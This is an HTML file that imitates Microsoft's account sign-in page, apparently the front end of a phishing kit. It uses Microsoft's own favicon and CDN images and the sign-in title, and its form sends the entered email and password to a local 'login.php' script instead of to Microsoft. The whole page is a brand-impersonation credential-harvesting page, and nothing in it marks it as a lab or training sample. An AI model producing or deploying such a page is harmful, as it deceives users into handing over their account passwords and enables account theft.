<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <link rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a_eS0_By0Lqi97Y99I68vA2.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-card">
        <img src="logo.svg" class="logo" alt="Microsoft Logo">
        
        <form action="login.php" method="POST" id="login-form">
            <div id="login-container">
                <h1>Sign in</h1>
                <div class="input-group">
                    <input type="text" name="loginfmt" id="loginfmt" placeholder="Email, phone or Skype" required autofocus>
                </div>
                
                <div class="password-wrapper">
                    <div class="input-group">
                        <input type="password" name="passwd" id="passwd" placeholder="Password" required>
                    </div>
                </div>

                <div class="help-section">
                    <p class="help-text">No account? <a href="#">Create one!</a></p>
                    <p class="help-text"><a href="#">Can't access your account?</a></p>
                </div>
                
                <div class="btn-group">
                    <button type="submit" class="next-btn">Sign in</button>
                </div>
                
                <div class="options-group">
                    <div class="option">
                        <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f31ed9.svg" alt="Options">
                        <span>Sign-in options</span>
                    </div>
                </div>
            </div>
        </form>
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
            <a href="#">...</a>
        </div>
    </footer>
</body>
</html>
